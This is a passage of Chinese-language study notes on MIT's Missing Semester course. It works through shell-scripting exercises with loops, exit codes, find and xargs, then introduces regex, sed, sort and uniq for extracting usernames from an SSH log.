<p>如果没有使用<code>export</code>，则我在zsh中<code>marco</code>了一次后，然后输入<code>bash</code>，在bash中执行<code>echo $MARCO_DIR</code>什么都不会输出</p>
<p>如果使用了<code>export</code>，则我在zsh中<code>marco</code>了一次后，然后输入<code>bash</code>，在bash中执行<code>echo $MARCO_DIR</code>会输出我之前<code>marco</code>的目录。</p>
<blockquote>
<p>注意修改了之后需要source才会生效</p>
</blockquote>
<details class="info">
<summary>source</summary>
<p>在 shell 中，<code>source</code> 命令用于在当前 shell 会话中执行一个脚本文件中的命令，而不创建新的子进程。这意味着所有在脚本中定义的变量、函数和环境设置都会直接影响 <strong>当前 shell 会话</strong> 。</p>
<p>与执行脚本的区别: 如果直接执行脚本，会在一个 <strong>新的子进程</strong> 中运行，脚本中的变量和函数不会影响当前 shell。</p>
<p>即如果我写了一个<code>cd ~</code>命令进一个文件comehome，然后执行<code>source comehome</code>，那么我确实进入了<code>~</code>目录，但是如果我直接执行<code>./comehome</code>，那么不会进入<code>~</code>目录。</p>
</details>
<ol>
<li>Say you have a command that fails rarely. In order to debug it you need to capture its output but it can be time consuming to get a failure run. Write a bash script that runs the following script until it fails and captures its standard output and error streams to files and prints everything at the end. Bonus points if you can also report how many runs it took for the script to fail.</li>
</ol>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-1"></a><span class="ch">#!/usr/bin/env bash</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-2"></a>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-3"></a><span class="w"> </span><span class="nv">n</span><span class="o">=</span><span class="k">$((</span><span class="w"> </span><span class="nv">RANDOM</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="m">100</span><span class="w"> </span><span class="k">))</span>
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-4"></a>
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-5"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>n<span class="w"> </span>-eq<span class="w"> </span><span class="m">42</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-6"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Something went wrong&quot;</span>
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-7"></a><span class="w">    </span>&gt;<span class="p">&amp;</span><span class="m">2</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;The error was using magic numbers&quot;</span>
</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-8"></a><span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-9"></a><span class="w"> </span><span class="k">fi</span>
</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-10"></a>
</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-30-11"></a><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Everything went according to plan&quot;</span>
</span></code></pre></div>
<p><code>n=$(( RANDOM % 100 ))</code> 表示生成一个0到99之间的随机数,使用两个括号是bash的特性，表示计算表达式。</p>
<p>即要求我写一个脚本，运行这个脚本直到它失败，并捕获它的标准输出和错误流到文件中，最后打印所有内容。</p>
<p>这个脚本在结束时会把错误信息输出到标准错误流，所以我们可以使用<code>2&gt;</code>来捕获错误流。</p>
<p>如下</p>
<p>首先将其保存为<code>script.sh</code></p>
<p>然后创建我们的脚本<code>run.sh</code>，首先创建一个<code>while</code>循环，然后创建一个<code>if</code>条件，如果脚本运行失败，则退出循环，否则就一直运行，把标准输出和错误流分别重定向到<code>output.txt</code>和<code>error.txt</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-31-1"></a><span class="ch">#!/usr/bin/env bash</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-31-2"></a><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-31-3"></a><span class="w">    </span>./script.sh<span class="w"> </span>&gt;&gt;<span class="w"> </span>output.txt<span class="w"> </span><span class="m">2</span>&gt;&gt;<span class="w"> </span>error.txt
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-31-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-31-5"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Script failed, retrying...&quot;</span>
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-31-6"></a><span class="w">        </span><span class="k">break</span>
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-31-7"></a><span class="w">    </span><span class="k">fi</span>
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-31-8"></a><span class="k">done</span>
</span></code></pre></div>
<p>这样就基本完成了,如果想要计算运行了多少次，可以再创建一个变量，在每次运行后加一。</p>
<p>一开始我的想法是这样的
<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-1"></a><span class="nv">count</span><span class="o">=</span><span class="m">0</span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-2"></a><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-3"></a><span class="w">    </span>./script.sh<span class="w"> </span>&gt;&gt;<span class="w"> </span>output.txt<span class="w"> </span><span class="m">2</span>&gt;&gt;<span class="w"> </span>error.txt
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-4"></a><span class="w">    </span><span class="nv">count</span><span class="o">=</span><span class="k">$((</span><span class="nv">$count</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-6"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Script failed, retrying...,</span><span class="nv">$count</span><span class="s2"> times&quot;</span>
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-7"></a><span class="w">        </span><span class="k">break</span>
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-8"></a><span class="w">    </span><span class="k">fi</span>
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-32-9"></a><span class="k">done</span>
</span></code></pre></div>
但是这样会导致上一条命令的<code>$?</code>变为<code>count+1</code>的值，所以需要调换一下位置</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-1"></a><span class="nv">count</span><span class="o">=</span><span class="m">0</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-2"></a><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-3"></a><span class="w">    </span><span class="nv">count</span><span class="o">=</span><span class="k">$((</span><span class="nv">$count</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="k">))</span>
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-4"></a><span class="w">    </span>./script.sh<span class="w"> </span>&gt;&gt;<span class="w"> </span>output.txt<span class="w"> </span><span class="m">2</span>&gt;&gt;<span class="w"> </span>error.txt
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-6"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Script failed, retrying...,</span><span class="nv">$count</span><span class="s2"> times&quot;</span>
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-7"></a><span class="w">        </span><span class="k">break</span>
</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-8"></a><span class="w">    </span><span class="k">fi</span>
</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-33-9"></a><span class="k">done</span>
</span></code></pre></div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>这里<code>./run.sh</code>结束脚本后使用<code>echo $count</code>并不会显示任何值，因为直接执行脚本会创建新的进程，所以如果想要在脚本结束后<code>echo $count</code>来查看，需要使用<code>source run.sh</code>来执行脚本。</p>
</div>
<p>4.As we covered in the lecture find’s -exec can be very powerful for performing operations over the files we are searching for. However, what if we want to do something with all the files, like creating a zip file? As you have seen so far commands will take input from both arguments and STDIN. When piping commands, we are connecting STDOUT to STDIN, but some commands like tar take inputs from arguments. To bridge this disconnect there’s the xargs command which will execute a command using STDIN as arguments. For example ls | xargs rm will delete the files in the current directory.</p>
<p>Your task is to write a command that recursively finds all HTML files in the folder and makes a zip with them. Note that your command should work even if the files have spaces (hint: check -d flag for xargs).</p>
<p>If you’re on macOS, note that the default BSD find is different from the one included in GNU coreutils. You can use -print0 on find and the -0 flag on xargs. As a macOS user, you should be aware that command-line utilities shipped with macOS may differ from the GNU counterparts; you can install the GNU versions if you like by using brew.</p>
<p>即要求我们写一个命令，递归地找到当前目录下的所有HTML文件，并把它们压缩成一个zip文件。提示是<code>xargs</code>的<code>-d</code>参数。</p>
<p>首先查看一下<code>xargs</code>命令，<code>xargs</code>命令可以接受标准输入作为参数，然后执行命令。</p>
<blockquote>
<p>tips:这里解决了我的一个疑问，之前我使用<code>ls | echo</code>不会echo任何东西，但是使用<code>ls | xargs echo</code>会echo所有文件名。这是因为<code>echo</code>以命令行参数的形式接受输入，所以不会接受标准输入，而<code>xargs</code>以标准输入作为参数，转化为命令行参数传递给<code>echo</code>,所以成功了</p>
</blockquote>
<p>首先递归找到当前目录下的所有HTML文件</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-34-1"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.html&quot;</span>
</span></code></pre></div>
<p>然后使用<code>xargs</code>来压缩这些文件</p>
<p>即使文件名中包含空格，使用<code>xargs -d</code>也可以正确处理。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-35-1"></a>touch<span class="w"> </span><span class="o">{</span><span class="m">1</span>..10<span class="o">}</span>.html<span class="w"> </span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-35-2"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.html&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="w"> </span>zip<span class="w"> </span>-r<span class="w"> </span>archive.zip
</span></code></pre></div>
<p>5.(Advanced) Write a command or script to recursively find the most recently modified file in a directory. More generally, can you list all files by recency?</p>
<p>即要求我们写一个命令或脚本，递归地找到当前目录下最近修改的文件，或者列出所有文件按修改时间排序。</p>
<p>可以使用<code>ls -t</code>来列出所有文件按修改时间排序</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#note-cs-tms-shell-tools-and-scripts-__codelineno-36-1"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>ls<span class="w"> </span>-lt
</span></code></pre></div>
<p>如果没有<code>xargs</code>，则<code>ls -lt</code>会接受不到参数，直接执行了<code>ls -lt</code></p></section><section class="print-page" id="note-cs-tms-data-wrangling" heading-number="2.4.2.4"><h1 id="note-cs-tms-data-wrangling-data-wrangling">Data Wrangling<a class="headerlink" href="#note-cs-tms-data-wrangling-data-wrangling" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3285 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 83 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 12 分钟</p>
</div>
<blockquote>
<p>这节课太炫了</p>
</blockquote>
<p>Data Wrangling，中文通常翻译为数据整理或数据清洗，是指将原始数据转换为更易于分析和使用的格式的过程。是数据分析和数据科学工作流程中的重要环节，因为高质量的数据是进行有效分析和建模的基础。通过数据整理，可以提高数据的可用性和可靠性，从而为后续的分析和决策提供坚实的基础。</p>
<p>这门课主要演示了各种处理文本数据的方法，以及使用<code>|</code>将各种命令连接起来，形成一个管道，从而实现更复杂优雅的数据处理任务。</p>
<h2 id="note-cs-tms-data-wrangling-_1">正则表达式<a class="headerlink" href="#note-cs-tms-data-wrangling-_1" title="Permanent link">&para;</a></h2>
<p>正则表达式(Regular Expression)是一种用于描述字符串模式的表达式。它可以在文本中搜索、替换、插入和删除特定的字符或字符组合。</p>
<ol>
<li>
<p><strong>字符匹配</strong>：</p>
<ul>
<li>普通字符：匹配自身，如 <code>a</code> 匹配字符 'a'。</li>
<li>特殊字符：使用反斜杠 <code>\</code> 转义，如 <code>\.</code> 匹配字符 '.'。</li>
<li><code>.</code>：匹配任意一个字符。</li>
</ul>
</li>
<li>
<p><strong>字符类</strong>：</p>
<ul>
<li>方括号 <code>[]</code>：匹配方括号内的任意一个字符，如 <code>[abc]</code> 匹配 'a'、'b' 或 'c'。</li>
<li>范围：使用连字符 <code>-</code> 表示范围，如 <code>[a-z]</code> 匹配所有小写字母。</li>
<li>否定：在方括号内使用 <code>^</code> 表示否定，如 <code>[^0-9]</code> 匹配所有非数字字符。</li>
</ul>
</li>
<li>
<p><strong>预定义字符类</strong>：</p>
<ul>
<li><code>\d</code>：匹配任意数字，相当于 <code>[0-9]</code>。</li>
<li><code>\D</code>：匹配任意非数字字符，相当于 <code>[^0-9]</code>。</li>
<li><code>\w</code>：匹配任意字母、数字或下划线字符，相当于 <code>[a-zA-Z0-9_]</code>。</li>
<li><code>\W</code>：匹配任意非字母、数字或下划线字符，相当于 <code>[^a-zA-Z0-9_]</code>。</li>
<li><code>\s</code>：匹配任意空白字符（空格、制表符等）。</li>
<li><code>\S</code>：匹配任意非空白字符。</li>
</ul>
</li>
<li>
<p><strong>量词</strong>：</p>
<ul>
<li><code>*</code>：匹配前面的字符零次或多次。<code>.*</code>可以匹配任意字符串。</li>
<li><code>+</code>：匹配前面的字符一次或多次。</li>
<li><code>?</code>：匹配前面的字符零次或一次。</li>
<li><code>{n}</code>：匹配前面的字符恰好 n 次。</li>
<li><code>{n,}</code>：匹配前面的字符至少 n 次。</li>
<li><code>{n,m}</code>：匹配前面的字符至少 n 次，至多 m 次。</li>
</ul>
</li>
<li>
<p><strong>位置匹配</strong>：</p>
<ul>
<li><code>^</code>：匹配字符串的开头。</li>
<li><code>$</code>：匹配字符串的结尾。</li>
<li><code>\b</code>：匹配单词边界。</li>
<li><code>\B</code>：匹配非单词边界。</li>
</ul>
</li>
<li>
<p><strong>分组和引用</strong>：</p>
<ul>
<li>括号 <code>()</code>：用于分组，如 <code>(abc)</code> 匹配字符串 'abc'，(a|b) 匹配 'a' 或 'b'。</li>
<li>反向引用：使用 <code>\1</code>、<code>\2</code> 等表示前面分组匹配的内容，如 <code>(a)(b)\1\2</code> 匹配 'abab'。</li>
</ul>
</li>
</ol>
<h2 id="note-cs-tms-data-wrangling-sed">sed<a class="headerlink" href="#note-cs-tms-data-wrangling-sed" title="Permanent link">&para;</a></h2>
<p>sed 是一种流编辑器，用于处理和转换文本数据。它允许您对文件或标准输入进行各种文本操作，如搜索、替换、插入、删除等。sed 通常用于批量处理文本文件，特别是在需要自动化文本处理任务时。</p>
<p>例如 <code>sed "s/REGEX/SUBSTITUTION/"</code>，其中 <code>REGEX</code> 部分是我们需要使用的正则表达式，而 <code>SUBSTITUTION</code> 是用于替换匹配结果的文本。</p>
<p>即搜寻REGEX，并替换为SUBSTITUTION。</p>
<p>在课程上，jon演示了如何使用sed来处理文本数据。目标是找出ssh的log文件中的用户信息。</p>
<p>大概是这样的信息</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-tms-data-wrangling-__codelineno-0-1"></a>Jan 17 03:13:00 thesquareplanet.com sshd[2631]: Disconnected from invalid user nameofuser 46.97.239.16 port 55920 [preauth]
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-tms-data-wrangling-__codelineno-1-1"></a>sed<span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/.*Disconnected from //&#39;</span>
</span></code></pre></div>
即会搜索所有包含<code>Disconnected from</code>的行，并将其替换为空字符串。</p>
<p>但是如果有人将<code>user</code>设置为<code>Disconnected from</code>，那么就会导致无法正确处理。</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-tms-data-wrangling-__codelineno-2-1"></a>Disconnected from invalid user Disconnected from 46.97.239.16 port 55920 [preauth]
</span></code></pre></div>
<p>这是因为在默认情况下，<code>*</code>和<code>+</code>都是贪婪的，会尽可能多地匹配字符。</p>
<p>所以遇到第二个<code>Disconnected from</code>时，会将其与前面的<code>Disconnected from</code>一起替换为空字符串。</p>
<p>可任意使用<code>*?</code>来取消贪婪，只匹配第一个;</p>
<p>这样匹配了用户名前面的信息，但是还需要匹配用户名后面的信息。</p>
<p>方法是使用<code>^</code>和<code>$</code>来匹配行首和行尾，进行一整行的匹配。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-tms-data-wrangling-__codelineno-3-1"></a>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*Disconnected from (invalid |authenticating )?user .* [^ ]+ port [0-9]+( \[preauth\])?$//&#39;</span>
</span></code></pre></div>
<p>这个的意思是：</p>
<ul>
<li><code>-E</code>：使用扩展正则表达式，因为<code>sed</code>太老了。</li>
<li><code>.*Disconnected from</code>：匹配<code>Disconnected from</code>。</li>
<li><code>(invalid |authenticating )?</code>：匹配<code>invalid</code>或<code>authenticating</code>，即user前面有可能是这俩。</li>
<li>
<p><code>user</code>：匹配<code>user</code>。</p>
</li>
<li>
<p><code>.*</code>：匹配用户名后面的任意字符</p>
</li>
<li>
<p><code>[^ ]+</code>：匹配一个或多个非空白字符(所以可以匹配到<code>46.97.239.16</code>)</p>
</li>
<li>
<p><code>port [0-9]+( \[preauth\])?$</code>：匹配<code>port</code>，然后是1个或多个数字，然后创建一个组来匹配<code>[preauth]</code>(使用了<code>\</code>来进行转义匹配<code>[]</code>)，然后是行尾。</p>
</li>
</ul>
<p>注意在这一正则表达式中空格的位置和原本行的位置是一样的，也就是空格也要被考虑匹配，不然就会匹配不上</p>
<p>这样我们就完全匹配了一整行，但是我们只需要用户名，所以需要将用户名提取出来，方法是使用<code>()</code>来创建一个组，然后使用<code>\2</code>来引用这个组，<code>\2</code>表示第二个组，因为第一个组是<code>invalid |authenticating</code>，第二个组才是是<code>user</code>跟着的。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-tms-data-wrangling-__codelineno-4-1"></a>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \[preauth\])?$/\2/&#39;</span>
</span></code></pre></div>
通过这种方法，我们终于提取出了所有用户名</p>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>可以使用<a href="https://regex101.com/r/qqbZqh/2">regex debugger</a>来理解，从这里我们已经可以看出</p>
</div>
<p>正则表达式的编写十分复杂，例如，这里有一篇关于如何匹配电子邮箱地址的文章 <a href="https://www.regular-expressions.info/email.html">e-mail address</a>，匹配电子邮箱可一点也<a href="https://emailregex.com/">不简单</a>。网络上还有很多关于如何匹配电子邮箱地址的讨论。人们还为其编写了测试用例及<a href="https://mathiasbynens.be/demo/url-regex">测试矩阵</a>。您甚至可以编写一个用于判断一个数<a href="https://www.noulakaz.net/2007/03/18/a-regular-expression-to-check-for-prime-numbers/">是否为质数</a>的正则表达式。</p>
<h2 id="note-cs-tms-data-wrangling-sort">sort<a class="headerlink" href="#note-cs-tms-data-wrangling-sort" title="Permanent link">&para;</a></h2>
<p>现在我们通过<code>sed</code>提取出了所有用户名，我们还可以利用<code>sort</code>来对这些用户名进行排序。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-tms-data-wrangling-__codelineno-5-1"></a>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \[preauth\])?$/\2/&#39;</span><span class="w"> </span>ssh.log<span class="w"> </span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-cs-tms-data-wrangling-__codelineno-5-2"></a><span class="p">|</span><span class="w"> </span>sort
</span></code></pre></div>
<code>sort</code>命令用于对文本文件中的内容进行排序。它可以按字母顺序、数字顺序或其他指定的方式对文件中的行进行排序。默认情况下，<code>sort</code>命令会按字母顺序对文本进行排序。</p>
<ul>
<li><code>-n</code>：按数值排序。</li>
<li><code>-r</code>：按相反顺序排序。</li>
<li><code>-u</code>：去除重复行。</li>
<li><code>-o</code>：将排序结果输出到指定文件。</li>
</ul>
<h2 id="note-cs-tms-data-wrangling-uniq">uniq<a class="headerlink" href="#note-cs-tms-data-wrangling-uniq" title="Permanent link">&para;</a></h2>
<p><code>uniq</code> 命令用于报告或忽略文件中的重复行。它通常与 sort 命令一起使用，用于处理排序后的数据。
例如</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-tms-data-wrangling-__codelineno-6-1"></a>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \[preauth\])?$/\2/&#39;</span><span class="w"> </span>ssh.log<span class="w"> </span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-cs-tms-data-wrangling-__codelineno-6-2"></a><span class="p">|</span><span class="w"> </span>sort
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-cs-tms-data-wrangling-__codelineno-6-3"></a><span class="p">|</span><span class="w"> </span>uniq<span class="w"> </span>-c
</span></code></pre></div>
<p><code>uniq -c</code>参数会统计每个用户名出现的次数。</p>
<p>然后再根据这些次数进行排序。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-tms-data-wrangling-__codelineno-7-1"></a>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \[preauth\])?$/\2/&#39;</span><span class="w"> </span>ssh.log<span class="w"> </span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-tms-data-wrangling-__codelineno-7-2"></a><span class="p">|</span><span class="w"> </span>sort
